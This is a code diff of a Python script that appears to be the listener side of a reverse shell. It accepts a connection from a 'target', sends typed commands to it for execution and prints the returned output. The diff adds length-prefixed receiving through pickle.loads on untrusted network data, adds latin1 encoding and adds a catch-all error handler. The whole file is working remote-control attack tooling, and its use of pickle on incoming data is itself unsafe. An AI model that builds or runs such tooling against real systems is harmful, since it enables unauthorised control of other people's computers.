@@ -1,4 +1,4 @@
-import socket, sys
+import socket, sys, pickle
 from argparse import ArgumentParser
 
 def get_arguments():
@@ -22,17 +22,20 @@ if __name__ == "__main__":
         print(f"[+] The Client {target_address} Has Connected To The Server")
 
         while True:
-            command = input(">>> ").encode()
-            if command.decode() == ("exit"):
+            command = input(">>> ").encode(encoding="latin1")
+            if command.decode(encoding="latin1") == ("exit"):
                 print("[-] Closing The Session")
-                target_socket.send(("exit").encode())
+                target_socket.send(("exit").encode(encoding="latin1"))
                 target_socket.close()
                 sys.exit()
             target_socket.send(command)
-            output = target_socket.recv(4096).decode()
-            print(output)
-            target_socket.send(command)
+            output_length = pickle.loads(target_socket.recv(4096))
+            output = target_socket.recv(int(output_length))
+            print(output.decode(encoding="latin1"))
     except KeyboardInterrupt:
-        target_socket.send(("exit").encode())
+        print("\nClosing The Session")
+        target_socket.send(("exit").encode(encoding="latin1"))
         target_socket.close()
         sys.exit()
+    except:
+        print("\nAn Unexpected Error Has Ocurred")
